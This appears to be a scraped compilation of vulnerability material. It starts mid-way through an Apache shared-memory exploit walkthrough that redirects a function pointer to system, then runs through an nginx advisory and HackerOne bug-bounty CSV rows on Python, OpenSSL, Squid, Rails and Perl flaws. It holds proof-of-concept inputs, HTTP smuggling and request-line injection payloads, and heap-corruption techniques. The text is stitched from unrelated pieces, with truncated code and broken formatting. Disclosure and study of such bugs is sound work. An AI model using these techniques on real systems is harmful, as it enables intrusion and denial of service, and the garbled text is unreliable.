Code 301 BytesWrap lines Copy Download1root@apaubuntu:~# cat /proc/6318/maps | grep rw-s

6(gdb) p &ap_scoreboard_image->parent[1]
7$19 = (process_score *) 0x7f4a9323e044
To locate all_buckets, we can make use of our knowledge of the prefork_child_bucket structure. We have:
Important structures of bucket items
Code 788 BytesWrap lines Copy Download1prefork_child_bucket {

10    int curr_locked;
11    char *fname;
12
13    ...
14}
15
16apr_proc_mutex_unix_lock_methods_t {
17    unsigned int flags;

19    apr_status_t (*acquire)(apr_proc_mutex_t *);
20    apr_status_t (*tryacquire)(apr_proc_mutex_t *);
21    apr_status_t (*release)(apr_proc_mutex_t *);

25    apr_lockmech_e mech;
26    const char *name;
27}
all_buckets[0]->mutex will be located in the same memory region as all_buckets[0]. Since meth is a static structure, it will be located in libapr's .data. Since meth points to functions defined in libapr, each of the function pointers will be located in libapr's .text.
Since we have knowledge of those region's addresses through /proc/self/maps, we can go through every pointer in Apache's memory and find one that matches the structure. It will be all_buckets[0].
As I mentioned, all_buckets's address changes at every graceful restart. This means that when our exploit triggers, all_buckets's address will be different than the one we found. This has to be taken into account; we'll talk about this later.
## 2. Write a fake prefork_child_bucket structure in the SHM
Reaching the function call
The code path to the arbitrary function call is the following:
Code 192 BytesWrap lines Copy Download1bucket_id = ap_scoreboard_image->parent[id]->bucket
2my_bucket = all_buckets[bucket_id]
3mutex = &my_bucket->mutex
4apr_proc_mutex_child_init(mutex)
5(*mutex)->meth->child_init(mutex, pool, fname)

Calling something proper
To exploit, we make (*mutex)->meth->child_init point to zend_object_std_dtor(zend_object *object), which yields the following chain:
Code 187 BytesWrap lines Copy Download1mutex = &my_bucket->mutex
2[object = mutex]
3zend_object_std_dtor(object)
4ht = object->properties
5zend_array_destroy(ht)
6zend_hash_destroy(ht)
7val = &ht->arData[0]->val
8ht->pDestructor(val)
pDestructor is set to system, and &ht->arData[0]->val is a string.

As you can see, both leftmost structures are superimposed.
## 3. Make all_buckets[bucket] point to the structure
Problem and solution
Right now, if all_buckets' address was unchanged in between restarts, our exploit would be over:

Get R/W over all memory after PHP's heap
Find all_buckets by matching its structure
Put our structure in the SHM
Change one of the process_score.bucket in the SHM so that all_bucket[bucket]->mutex points to our payload

As all_buckets' address changes, we can do two things to improve reliability: spray the SHM and use every process_score structure - one for each PID.
Spraying the shared memory
If all_buckets' new address is not far from the old one, my_bucket will point close to our structure. Therefore, instead of having our prefork_child_bucket structure at a precise point in the SHM, we can spray it all over unused parts of the SHM. The problem is that the
structure is also used as a zend_object, and therefore it has a size of (5 * 8 =) 40 bytes to include zend_object.properties.
Spraying a structure that big over a space this small won't help us much.
To solve this problem, we superimpose the two center structures, apr_proc_mutex_t and zend_array, and spray their address in the rest of the shared memory.
The impact will be that prefork_child_bucket.mutex and zend_object.properties point to the same address.
Now, if all_bucket is relocated not too far from its original address, my_bucket will be in the sprayed area.

Using every process_score
Each Apache worker has an associated process_score structure, and with it a bucket index.
Instead of changing one process_score.bucket value, we can change every one of them, so that they cover another part of memory. For instance:
Code 284 BytesWrap lines Copy Download1ap_scoreboard_image->parent[0]->bucket = -10000 -> 0x7faabbcc00 <= all_buckets <= 0x7faabbdd00
2ap_scoreboard_image->parent[1]->bucket = -20000 -> 0x7faabbdd00 <= all_buckets <= 0x7faabbff00
3ap_scoreboard_image->parent[2]->bucket = -30000 -> 0x7faabbff00 <= all_buckets <= 0x7faabc0000
This multiplies our success rate by the number of apache workers. Upon respawn, only one worker have a valid bucket number, but this is not a problem because the others will crash, and immediately respawn.
Success rate
Different Apache servers have different number of workers. Having more workers mean we can spray the address of our mutex over less memory, but it also means we can specify more index for all_buckets. This means that having more workers improves our success rate. After a few tries on my test Apache server of 4 workers (default), I had ~80% success rate.
Again, if the exploit fails, it can be restarted the next day as Apache will still restart properly. Apache's error.log will nevertheless contain notifications about its workers segfaulting.
## 4. Await 6:25AM for the exploit to trigger
Well, that's the easy step.

A security issue in nginx resolver was identified, which might allow an
attacker to cause 1-byte memory overwrite by using a specially crafted
DNS response, resulting in worker process crash or, potentially, in
arbitrary code execution (CVE-2021-23017).
The issue only affects nginx if the ""resolver"" directive is used in
the configuration file.  Further, the attack is only possible if an
attacker is able to forge UDP packets from the DNS server.
The issue affects nginx 0.6.18 - 1.20.0.
The issue is fixed in nginx 1.21.0, 1.20.1.
Patch for the issue can be found here:

Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",High,7.95,Classic Buffer Overflow,Buffer overflow in PyCArg_repr in _ctypes/callproc.c for Python 3.x to 3.9.1,"jordyzomer  submitted a report to Internet Bug Bounty.Jan 22nd (2 years ago)TL;DR Description
Python 3.x through 3.9.1 has a buffer overflow in PyCArg_repr in _ctypes/callproc.c, which may lead to remote code execution in certain Python applications that accept floating-point numbers as untrusted input, as demonstrated by a 1e300 argument to c_double.from_param. This occurs because sprintf is used unsafely. The CVE number used for this vulnerability is CVE-2021-3177.
Details
There's a buffer overflow in the PyCArg_repr() function in _ctypes/callproc.c.
The buffer overflow happens due to not checking the length of th sprintf() function on line: 
    case 'd':
sprintf(buffer, ""<cparam '%c' (%f)>"",
self->tag, self->value.d);
break;
Because we control self->value.d we could make it copy extreme values. For example we could make it copy 1e300 which would be a 1 with 300 zero's  to overflow the buffer.
This could potentially cause RCE when a user allows untrusted input in these functions.
Proof of Concept



from ctypes import *
c_double.from_param(1e300)
 buffer overflow detected : terminated
Aborted

Impact
Availability
Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.
Access Control
Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program’s implicit security policy.
Other
 When the consequence is arbitrary code execution, this can often be used to subvert any other security service.",https://hackerone.com/reports/1084342,No value,No value,No value,2021,1,22,9,48
Internet Bug Bounty,1-10,1.0,No value,"$2,000.00",High,7.95,Classic Buffer Overflow,CVE-2021-3711: SM2 decrypt  buffer overflow,"ouyang  submitted a report to Internet Bug Bounty.Sep 27th (about 1 year ago)CVE-2021-3711
In order to decrypt SM2 encrypted data an application is expected to call the API function EVP_PKEY_decrypt(). Typically an application will call this function twice. The first time, on entry, the ""out"" parameter can be NULL and, on exit, the ""outlen"" parameter is populated with the buffer size required to hold the decrypted plaintext. The application can then allocate a sufficiently sized buffer and call EVP_PKEY_decrypt() again, but this time passing a non-NULL value for the ""out"" parameter. A bug in the implementation of the SM2 decryption code means that the calculation of the buffer size required to hold the plaintext returned by the first call to EVP_PKEY_decrypt() can be smaller than the actual size required by the second call. This can lead to a buffer overflow when EVP_PKEY_decrypt() is called by the application a second time with a buffer that is too small. 
Reproduce step:
Examples of data that triggered the vulnerability

SM2 ciphertext data
Examples of ciphertext data are as follows:

3072022070DAD60CDA7C30D64CF4F278A849003581223F5324BFEC9BB329229BFFAD21A6021F18AFAB2B35459D2643243B242BE4EA80C6FA5071D2D847340CC57EB9309E5D04200B772E4DB664B2601E3B85E39E4DB664B2601E3B85E39C4AA308BE13588C301308E3588C01308E3588E3308E4

Parse SM2 ciphertext
The length of this ciphertext is 116 bytes. Parse this group of ciphertexts according to the ASN.1 format:

3072 //30 indicates the SEQUENCE type, 72 indicates that the total length of the subsequent data is 114 bytes
0220 //02 means INTEGER type, 20 means the length of the integer is 32 bytes
70DAD60CDA7C30D64CF4F278A849003581223F5324BFEC9BB329229BFFAD21A6 //32-byte XCoordinate
021F //02 means INTEGER type, 1F means the length of the integer is 31 bytes
18AFAB2B35459D2643243B242BE4EA80C6FA5071D2D847340CC57EB9309E5D //31-byte YCoordinate
0420 //04 means OCTETSTRING type, 20 means the length of the string is 32 bytes
0B772E4DB664B2601E3B85E39C4AA8C2C1910308BE13B331E009C5A9258C29FD //32-byte HASH
040B //04 means OCTETSTRING type, 0B means the length of the string is 11 bytes
6D588BE9260A94DA18E0E6 //11-byte ciphertext
After verification, the above-mentioned XCoordinate and YCoordinate satisfy the SM2 elliptic curve equation.

Trigger heap overflow
When pkey_sm2_decrypt is called for the first time, the pointer out is NULL and msg_len is equal to 116. The sm2_plaintext_size function returns 10 (msg_len-overhead = 116-106).

10 bytes of memory are allocated through OPENSSL_malloc, and out points to this memory.
The second call to pkey_sm2_decrypt, since the ciphertext has 11 bytes, the decryption result is also 11 bytes.
The memory pointed to by out is 10 bytes, and the decrypted result is 11 bytes, resulting in 1 byte being written out of bounds.
Impact
A malicious attacker who is able present SM2 content for decryption to an application could cause attacker chosen data to overflow the buffer by up to a maximum of 62 bytes altering the contents of other data held after the buffer, possibly changing application behaviour or causing the application to crash. The location of the buffer is application dependent but is typically heap allocated. 
OpenSSL versions 1.1.1k and below are affected by this issue. Users of these versions should upgrade to OpenSSL 1.1.1l.
OpenSSL 1.0.2 is not impacted by this issue.
OpenSSL 3.0 alpha/beta releases are also affected but this issue will be addressed before the final release.",https://hackerone.com/reports/1352429,No value,No value,No value,2021,9,27,13,47

2019-11-04 13:43:22 UTC CVE Assignment

I can give more details than what is publicly available.
On the initial report from 2019-07-24 there were 4 issues. Only 1 of these issues is currently covered by the CVE-2019-18678.
Issue 1 : undisclosed Squid 3 issue
There is also an undisclosed Security filter bypass for Squid 3.x. This is a wonfix for Squid because Squid 3.x is not maintained anymore.
Without complete details this is an abuse of separators characters which allows access to urls where a security filter in Squid is present to prevent such locations from being accessed.
Project maintainer response:

Please be aware that Squid-3 has been deprecated for several years now.
Several of the problems you are pointing out are well-known issues with
the HTTP protocol design from RFC2616 itself not being clear. Squid-3
primarily implements that specification, with only sprinkling of RFC7230.
Squid-4 increases the upgrade to RFC7230 specification with
implementation of the majority of message parsing updates. Though that
is still an ongoing work.
(...)
As do Squid-4 releases. The fix is to upgrade the proxy to a version
where the problem has been fixed.

Issue 2 : HTTP Response Splitting issue on bad withespaces before header's colon
Squid allowed bad withespaces characters between the header title and the colon (before value).
This is forbidden in RFC 7230.

3.2.  Header Fields
Each header field consists of a case-insensitive field name followed
by a colon ("":""), optional leading whitespace, the field value, and
optional trailing whitespace.
header-field   = field-name "":"" OWS field-value OWS
field-name     = token
(...)
3.2.4.  Field Parsing
(...)
No whitespace is allowed between the header field-name and colon.  In
the past, differences in the handling of such whitespace have led to
security vulnerabilities in request routing and response handling.  A
server MUST reject any received request message that contains
whitespace between a header field-name and colon with a response code
of 400 (Bad Request).  A proxy MUST remove any such whitespace from a
response message before forwarding the message downstream.

This could be used to perform HTTP Smuggling attacks (if you want more details on exploitations I can add some very detailled examples, I'll just give you a short version).
Various invalid syntax where a space or pseudo space is added before ':' in the header line could be used against Squid to obtain an HTTP Response splitting attack:

Transfer-Encoding : chunked\r\n
Transfer-Encoding\t: chunked\r\n
Transfer-Encoding\f: chunked\r\n
Transfer-Encoding\f: chunked\r\n
Transfer-Encoding\r: chunked\r\n
Transfer-Encoding\x0b: chunked\r\n
Transfer-Encoding\t\x0b \r\f: chunked\r\n

Squid would give 3 response for this request (it should see only 2 requests, one from 01 to 12, and one from 13 to 15, but Squid saw one from 01 to 08, one from 09 to 12 and one from 14 to 15):
01 POST /?t=41 HTTP/1.1\r\n
02 Host: dummy-host.example.com\r\n
03 X-REQUEST-IDENTIFIER: 41\r\n
04 Content-Length: 92\r\n
05 Transfer-Encoding\x0b: chunked\r\n
06 \r\n
07 0\r\n
08 \r\n
09 GET /foo.html?t=42 HTTP/1.1\r\n
10 Host: dummy-host.example.com\r\n
11 X-REQUEST-IDENTIFIER: 42\r\n
12 \r\n
13 GET /bar.html?t=43 HTTP/1.1\r\n
14 Host: dummy-host.example.com\r\n
15 X-REQUEST-IDENTIFIER: 43\r\n
15 \r\n
Impacts are quite high, like HTTP Cache poisoning for any actor set in front of Squid, and security filter bypass for this previous actor also. Adding extra responses from the Squid stream is definitively a good way for adding choas on the HTTP chain (Dos, Xss, etc).
Issue 3 : Undisclosed SeverSide Request Forgery issue
This one is only fixed on master. The fix is not present on any published version of Squid. So we may talk about it later.
Issue 4 : Undisclosed HTTP Request Splitting
This one is still present and not yet fixed. So we may talk about it later, because I think it will be fixed one day.
I'm pretty sure this issue will soon be discovered by other bounty hunters. So I don't know if I should already give more details to claim precedence, currently I'll keep the details undisclosed and let the project maintainers act on that.
Summary
Issue #2 is the one covered by the published CVE.
For issues #3 & #4 I'm pretty sure that I will make reports later.
For issue #1 I'm not sure this can be covered by this program, I could give you more details if you want.
Impact
Like most HTTP Smuggling issue impact is not always directly targeted on Squid, here (if we only talk about issue #2) the impact is very important for HTTP actors set in front of squid (like an SSL terminator).

Internet Bug Bounty,1-10,1.0,No value,"$1,200.00",Medium,5.45,None,Request line injection via HTTP/2 in Apache mod_proxy,"albinowax  submitted a report to Internet Bug Bounty.Nov 4th (about 1 year ago)I've written this issue up fully here: https://portswigger.net/research/http2#request
In case it's useful, here's the original report as sent to Apache:

I'd like to report a vulnerability in Apache mod_proxy when used with HTTP/2 enabled. 
It fails to reject HTTP requests that contain spaces in the :method HTTP/2 pseudo-header. This leads to a request-line injection vulnerability when it downgrades the requests to HTTP/1.1 and routes them on to the backend.
Attacker HTTP/2 request:
Code 93 BytesWrap lines Copy Download1:method: GET /anything HTTP/1.1
2:path: /
3:authority: psres.net
4Accept-Encoding: gzip, deflate
Resulting request forwarded to the backend by mod_proxy:
Code 83 BytesWrap lines Copy Download1GET /anything HTTP/1.1 / HTTP/1.1
2Host:: psres.net
3Accept-Encoding: gzip, deflate  
Provided the back-end server tolerates trailing junk in request lines, this enables attackers to bypass front-end security rules, poison web caches, and > change the protocol to HTTP/0.9 or 1.0, potentially enabling further attacks. I have identified some vulnerable systems in the wild.

Please let me know if you'd like any additional information

https://www.ruby-lang.org/en/news/2021/11/15/date-parsing-method-regexp-dos-cve-2021-41817/
CVE-2021-41817
Here are the details from the official article:

Date’s parsing methods including Date.parse are using Regexps internally, some of which are vulnerable against regular expression denial of service. Applications and libraries that apply such methods to untrusted input may be affected.
The fix limits the input length up to 128 bytes by default instead of changing the regexps. This is because Date gem uses many Regexps and it is possible that there are still undiscovered vulnerable Regexps. For compatibility, it is allowed to remove the limitation by explicitly passing limit keywords as nil like Date.parse(str, limit: nil), but note that it may take a long time to parse.
Please update the date gem to version 3.2.1, 3.1.2, 3.0.2, and 2.0.1, or later. You can use gem update date to update it. If you are using bundler, please add gem ""date"", "">= 3.2.1"" to your Gemfile.

Please let me know if any additional information is needed

Internet Bug Bounty,1-10,1.0,No value,"$12,000.00",Critical,9.8,Classic Buffer Overflow,UrnState Heap Overflow,"jeriko_one  submitted a report to Internet Bug Bounty.Mar 19th (3 years ago)Summary:
When handling a URN Request an attacker controlled response can  cause Squid to overflow a heap buffer. The buffer exist within a struct so not only does it allow an attacker to overflow adjacent memory, but also control a pointer that follows the buffer enabling them to free arbitrary memory. Paired with the Cache Manager bypass that I reported earlier, an attacker will know which addresses are valid. This can lead to RCE and was stated in the serverity of the Squid announce. 
Squid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_7.txt

Steps To Reproduce:
You must add the following to your squid.conf to allow URN request

The squid child will crash even without Asan, but it'll automatically restart. You can check PIDs to confirm it did crash or you can build with ASan if you want to see the crash output.

Analysis
When handling an URN request from a user Squid makes a request to the remote
server to retrieve a list of URLs. The response is handled via urnHandleReply.
The response from the server is buffered into urnState->reqbuf as Squid reads
data in. This buffer is of length URN_REQBUF_SZ 4096
urnHandleReply can be called into multiple times as it waits for
urlres_e->store_status != STORE_PENDING and the current offset into reqbuf
held by urnState->reqofs is less than URN_REQBUF_SZ.
Code 431 BytesWrap lines Copy Download1    if (urlres_e->store_status == STORE_PENDING &&
2            urnState->reqofs < URN_REQBUF_SZ) {
3        tempBuffer.offset = urnState->reqofs;
4        tempBuffer.length = URN_REQBUF_SZ;
5        tempBuffer.data = urnState->reqbuf + urnState->reqofs;
6        storeClientCopy(urnState->sc, urlres_e,
7                        tempBuffer,

9                        urnState);
10        return;
11    }
urnHandleReply will prepare a StoreIOBuffer object filling it with urnState
buffer, reqofs, and how the length.
Unfortunately this tempBuffer has the total length of urnState->reqbuf
URN_REQBUF_SZ, instead of the amount of data that is left. Whenever the
response is being copied a second time into the buffer it can overflow. The
attacker can control how much is overflowed by adjusting the response.
Impact
This overflow has 2 useful features for someone trying to exploit Squid. The
first obvious one being overflowing into an adjacent memory region. An
attacker that was able to align the heap in such a way that a virtual table
pointer was after the urnState object could gain control of the instructor
pointer, thus, gaining control of the Squid process.
The second is that before urnState overflows into that adjacent object it will
overflow the pointer urlres within itself. This pointer later is free'd. An
attacker with knowledge of current addresses in Squid could use this to
trigger a Use-After-Free.celt   changed the status to Triaged. Mar 19th (3 years ago)Hello @jeriko_one,

Code 121 BytesWrap lines Copy Download1class TestsController < ApplicationController
2  extend ActiveSupport::Concern
3
4  def index
5    redirect_to('/')
6  end
7end
when sending a request like the following where the URL has a mixed case characters 
Code 66 BytesWrap lines Copy Download1curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: Evil.com'
Or all capital case 
Code 66 BytesWrap lines Copy Download1curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: EVIL.COM'
Expected behavior
Code 168 BytesWrap lines Copy Download1<div id=""container"">
2  <h2>To allow requests to evil.com, add the following to your environment configuration:</h2>
3  <pre>config.hosts &lt;&lt; ""Evil.com""</pre>

Notes
This was fixed in main in this PR https://github.com/rails/rails/pull/41435 but still affects <= 6.1.3.1 
The problem is in this code https://github.com/rails/rails/blob/6-1-stable/actionpack/lib/action_dispatch/middleware/host_authorization.rb#L115
Code 167 BytesWrap lines Copy Download1origin_host = valid_host.match(
2  request.get_header(""HTTP_HOST"").to_s.downcase)
3forwarded_host = valid_host.match(
4  request.x_forwarded_host.to_s.split(/,\s?/).last)
forwarded_host is missing a downcase after the .to_s, which results in nil assigned to forwarded_host, which then results in true in the following  code
Code 127 BytesWrap lines Copy Download1origin_host && @permissions.allows?(origin_host[:host]) && (forwarded_host.nil? || @permissions.allows?(forwarded_host[:host]))
because of the nil? check on the forwarded_host
Code 66 BytesWrap lines Copy Download1forwarded_host.nil? || @permissions.allows?(forwarded_host[:host])
The examples I gave are using localhost, but I also confirmed this using a production environment with a configuration like the following

Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Denial of Service,ASN.1 BIO excessive memory allocation (CVE-2016-2109),"geeknik  submitted a report to Internet Bug Bounty.Apr 26th (7 years ago)On 4 April 2016 I reported a bug to the OpenSSL Security Team where I was able to force OpenSSL to use large amounts of cpu time, memory and swap space. They confirmed receipt on 6 April 2016 and on 22 April 2016 I was notified that they were assigning CVE-2016-2109 to this flaw and the fix was committed to git on 22 April 2016. 
Code 963 BytesWrap lines Copy Download1The main cause is the way asn1_d2i_read_bio works: it allocates memory depending on the length field. Your test cases looks like this:
2
330 84 30 30 30 30 30
4
5Which translates to a SEQUENCE with a length of 0x30303030 which explains the huge memory requirements.
6
7In some cases this is intended (for example large CMS messages) so we can't just reject these. Additionally because the input comes from a BIO we may not know the actual length of the data (e.g. from a pipe) so we can't immediately determine if there isn't enough data to read. We can however read the input in
8smaller chunks and determine if there is an unexpected EOF. That would mean that you couldn't have a tiny file allocate huge amounts of memory. We currently have a patch being reviewed that does this: that would reject your test case instead of allocating lots of memory.
9
10If you're calling the memory based ASN.1 decoders this shouldn't happen because they can sanity check length fields.

5====================================================

7Severity: Low
8
9During key agreement in a TLS handshake using a DH(E) based ciphersuite a
10malicious server can send a very large prime value to the client. This will
11cause the client to spend an unreasonably long period of time generating a key
12for this prime resulting in a hang until the client has finished. This could be
13exploited in a Denial Of Service attack.
14
15Due to the low severity of this issue we are not issuing a new release of
16OpenSSL 1.1.0 or 1.0.2 at this time. The fix will be included in OpenSSL 1.1.0i
17and OpenSSL 1.0.2p when they become available. The fix is also available in
18commit ea7abeeab (for 1.1.0) and commit 3984ef0b7 (for 1.0.2) in the OpenSSL git

Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Denial of Service,Excessive allocation of memory in dtls1_preprocess_fragment() (CVE-2016-6308),"theyarestone  submitted a report to Internet Bug Bounty.Apr 18th (6 years ago)This issue is very similar to CVE-2016-6307. The underlying defect is different
but the security analysis and impacts are the same except that it impacts DTLS.
A DTLS message includes 3 bytes for its length in the header for the message.
This would allow for messages up to 16Mb in length. Messages of this length are
excessive and OpenSSL includes a check to ensure that a peer is sending
reasonably sized messages in order to avoid too much memory being consumed to
service a connection. A flaw in the logic of version 1.1.0 means that memory for
the message is allocated too early, prior to the excessive message length
check. Due to way memory is allocated in OpenSSL this could mean an attacker
could force up to 21Mb to be allocated to service a connection. This could lead
to a Denial of Service through memory exhaustion. However, the excessive message
length check still takes place, and this would cause the connection to
immediately fail. Assuming that the application calls SSL_free() on the failed
conneciton in a timely manner then the 21Mb of allocated memory will then be
immediately freed again. Therefore the excessive memory allocation will be
transitory in nature. This then means that there is only a security impact if:
1) The application does not call SSL_free() in a timely manner in the
event that the connection fails
or
2) The application is working in a constrained environment where there
is very little free memory
or
3) The attacker initiates multiple connection attempts such that there
are multiple connections in a state where memory has been allocated for
the connection; SSL_free() has not yet been called; and there is
insufficient memory to service the multiple requests.
Except in the instance of (1) above any Denial Of Service is likely to
be transitory because as soon as the connection fails the memory is
subsequently freed again in the SSL_free() call. However there is an
increased risk during this period of application crashes due to the lack
of memory - which would then mean a more serious Denial of Service.
This issue does not affect TLS users.

Code 374 BytesWrap lines Copy Download1When a match is anchored against the start of a string, the regexp can be compiled to include a fixed string match against a fixed offset in the string. In some cases, where the matched against string included UTF-8 before the fixed offset, this could result in attempting a memcmp() which overlaps the end of the string and potentially past the end of the allocated memory.
Arguments for:##
On 29 August 2016, Tony says It *might* be possible to use this as a hard to trigger denial of service attack, eg. if the memcmp() went past the end of a page into unmapped memory.
On the same day in another comment, Tony says An attacker that can control the regexp *might* be able to use that to examine the contents of memory beyond the terminating NUL, which would be critical if that previously held a password or anything else sensitive.

Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Memory Corruption - Generic,Perl 5.22 VDir::MapPathA/W Out-of-bounds Reads and Buffer Over-reads,"johnleitch  submitted a report to Internet Bug Bounty.Jan 13th (7 years ago)I have reported multiple vulnerabilities in Perl that have now been fixed.
https://rt.perl.org/Public/Bug/Display.html?id=126755

Perl 5.22 suffers from two out-of-bounds read and multiple small buffer over-read vulnerabilities in the VDir::MapPathA and VDir::MapPathW functions that could potentially be exploited to achieve arbitrary code execution. The out-of-bounds read issues exist because the functions in question do not validate that the chr argument passed to DriveIndex, which calculates an index:
    inline int DriveIndex(char chr)
{
if (chr == '\' || chr == '/')
return ('Z'-'A')+1;
return (chr | 0x20)-'a';
};
In the VDir::MapPathA function, DriveIndex is called with a potentially untrusted value, pInName,  and the return value is then passed to GetDirA:
char VDir::MapPathA(const char pInName)
{   /*


possiblities -- relative path or absolute path with or without drive letter


OR UNC name
*/
[...]
    if (pInName[1] == ':') {
[...]
}
else {
/ relative path with drive letter /
strcpy(szBuffer, GetDirA(DriveIndex(*pInName)));
strcat(szBuffer, &pInName[2]);
if(strlen(szBuffer) > MAX_PATH)
szBuffer[MAX_PATH] = '\0';
	    DoGetFullPathNameA(szBuffer, sizeof(szLocalBufferA), szLocalBufferA);
}
}
else {
[...]
}
    return szLocalBufferA;
}


GetDirA then uses the unbounded index argument to index into dirTableA, a fixed length char pointer array.
    inline const char GetDirA(int index)
{
char ptr = dirTableA[index];
if (!ptr) {
/ simulate the existence of this drive /
ptr = szLocalBufferA;
ptr[0] = 'A' + index;
ptr[1] = ':';
ptr[2] = '\';
ptr[3] = 0;
}
return ptr;
};
In cases where index is attacker controlled, this behavior can be used to read outside of the dirTableA array. This is especially problematic because the value returned is then copied to a fixed length buffer using strcpy:
strcpy(szBuffer, GetDirA(DriveIndex(*pInName)));
If an attacker can manipulate the layout of memory to trick GetDirA into returning a string larger than szBuffer, a buffer overflow will occur. The issue in VDir::MapPathW is nearly identical..
Further, multiple small and less critical buffer over-reads exist in both VDir::MapPathA and VDir::MapPathW:
char VDir::MapPathA(const char pInName)
{   /*


possiblities -- relative path or absolute path with or without drive letter


OR UNC name
*/
[...]
    if (!length) <<< Check here confirms the buffer is at least of length 2 (including null) before continuing execution.
return (char*)pInName;
    [...]
    if (pInName[1] == ':') { <<< While technically no over-read can occur here, pInName is a single character, this checks the null terminator.
/ has drive letter /
if (IsPathSep(pInName[2])) { <<<< This could cause an over-read because the string could possibly be of length 2 (including null).
/ absolute with drive letter /
DoGetFullPathNameA((char)pInName, sizeof(szLocalBufferA), szLocalBufferA);
}
else {
/ relative path with drive letter /
strcpy(szBuffer, GetDirA(DriveIndex(pInName)));
strcat(szBuffer, &pInName[2]); <<<< This could cause an over-read for the same reason.
if(strlen(szBuffer) > MAX_PATH)
szBuffer[MAX_PATH] = '\0';
	    DoGetFullPathNameA(szBuffer, sizeof(szLocalBufferA), szLocalBufferA);
}
}
else {
[...]
}
}
    return szLocalBufferA;
}


To observe the out-of-bounds read vulnerability in VDir::MapPathA, the following script can be executed while Perl is under a debugger:
print glob ""]:"";
Which will result in an exception similar to the following:

To fix the issue, it is recommended that the VDir::MapPathA and VDir::MapPathW functions validate the drive letter to ensure no out-of-bounds reads occur, and also check the length of the pInName argument to ensure no buffer over-reads occur. A proposed patch is attached. However, the patch only addresses the issues in VDir::MapPathA because it was not immediately clear how to hit VDir::MapPathW for the purpose of testing.

affects: (basically all versions of smtplib with starttls support and projects relying on it)
python 2.7.2 - 2.7.11 (dates back ~14 years)
python 3.0 - 3.5.1 (dates back ~7 years)

Python's implementation of smtplib fails to raise an exception upon an unexpected response during negotiation of tls via the starttls protocol. This allows a MiTM capable of injecting smtp messages to force smtplib to silently abort tls negotiation proceeding to transmit cleartext. (impacting confidentiality)
For more details see [1]
potentially affects a variety of open source projects from Django, web2py, ...
initially reported to python PSRT (timeline see [1]) with details, PoC [2] and patch [2]. The patch was accepted and recently landed in python 2.7/3.x [3,4].
full details and the actual research material that was securely disclosed to Python PSRT will be made available at [1] (currently a preliminary vulnerability note)
the PoC striptls [2] is a generic protocol independent tls interception proxy written in python that is also capable of probing for various starttls stripping vectors in smtp, pop3, imap, ftp, xmpp, acap and irc. It is also available via pip install striptls (pretty handy for sniffing/proxying proprietary protocols based on top of implicit/explicit tls)
Vendor announcements: [5,6,7]
the preliminary vulnerability note [1] will be updated in accordance with the Python software release scheduled for June 26th.

There's no check preventing i from overflowing, meaning that a string consisting of multiple tabs spread over multiple lines combined with a large tabsize can cause the allocation of an undersized string buffer.
With some simple heap manipulation the length of the copy into this buffer can be controlled, and it's pretty easy to corrupt memory in such a way as to gain native code execution:
[h1|----------][h2|\t\n\t\n....][h3|----------]
h1: PyStringObject header of undersized buffer
h2: PyStringObject header of tabstring
By grooming the heap such that this allocation pattern is achieved when the expandtabs function starts expanding the h2 string into the h1 inline buffer it will overflow into the string being expanded, overwriting the tabs in the original string with spaces so that the second loop won't expand them anymore.
By carefully crafting the string to expand and choosing the tabsize you can limit the extent of the memory corruption to chosen objects.
Getting code execution is simply a matter of pointing the ob_type field of the h2 string header to a controlled address with a fake struct _typeobject. The struct contains the following function pointers which will be called when their corresponing python function is called:
  destructor tp_dealloc;
printfunc tp_print;
getattrfunc tp_getattr;
setattrfunc tp_setattr;
cmpfunc tp_compare;
reprfunc tp_repr;
Patch:
You've actually already patched this bug in a copy-and-paste version of this function... In fact there seem to be at least three versions of expandtabs; transmogrify.h and stropmodule.c are both vulnerable; stringobject.c isn't. I'm not familiar enough with the code to know when each version will be used.
The patch is to use the stringobject.c implementation which does the overflow check correctly, but here's a quick patch (for the 2.7 branch) which will do the job:

Proof of Concept
Run this script for a very simple crashing PoC for 32-bit python 2.7 which should crash at at address near 0x20202020 (since the ob_type field will be overwritten with spaces.) No idea if the heap manipulation used here will work on other platforms but it should be easy to do.

Internet Bug Bounty,1-10,1.0,No value,"$1,500.00",Critical,9.5,Memory Corruption - Generic,LZMADecompressor.decompress Use After Free,"johnleitch  submitted a report to Internet Bug Bounty.Sep 28th (6 years ago)I have submitted a vulnerability that has now been fixed. The report includes a proof of concept that demonstrates code execution. The submitted patch was accepted with minor changes.
https://bugs.python.org/issue28275

Python 3.5.2 suffers from a use after free vulnerability caused by the behavior of the LZMADecompressor.decompress method. The problem exists due to a dangling pointer created by an incomplete error path in the _lzma!decompress function.
static PyObject 
decompress(Decompressor d, uint8_t data, size_t len, Py_ssize_t max_length)
{
char input_buffer_in_use;
PyObject result;
lzma_stream *lzs = &d->lzs;
    / Prepend unconsumed input if necessary /
if (lzs->next_in != NULL) {
[...]
}
else {
lzs->next_in = data;
lzs->avail_in = len;
input_buffer_in_use = 0;
}
    result = decompress_buf(d, max_length);
if(result == NULL)
return NULL;
[...]
}
When the function is first called, lzs->next_in is NULL, so it is set using the data argument. If the subsequent call to decompress_buf fails because the stream is malformed, the function returns while maintaining the current value for lzs->next_in.
A couple returns later, the allocation pointed to by lzs->next_in (data) is freed:
static PyObject 
_lzma_LZMADecompressor_decompress(Decompressor self, PyObject args, PyObject kwargs)
{
PyObject return_value = NULL;
static char _keywords[] = {""data"", ""max_length"", NULL};
Py_buffer data = {NULL, NULL};
Py_ssize_t max_length = -1;
    if (!PyArg_ParseTupleAndKeywords(args, kwargs, ""y*|n:decompress"", _keywords,
&data, &max_length))
goto exit;
return_value = _lzma_LZMADecompressor_decompress_impl(self, &data, max_length);
exit:
/ Cleanup for data /
if (data.obj)
PyBuffer_Release(&data);
    return return_value;
}
At this point, any calls to decompress made to the same Decompressor instance (a typical use case--multiple calls may be necessary to decompress a single stream) will result in a memcpy to the dangling lzs->next_in pointer, and thus memory corruption.
static PyObject 
decompress(Decompressor d, uint8_t data, size_t len, Py_ssize_t max_length)
{
char input_buffer_in_use;
PyObject result;
lzma_stream *lzs = &d->lzs;
    / Prepend unconsumed input if necessary /
if (lzs->next_in != NULL) {
size_t avail_now, avail_total;
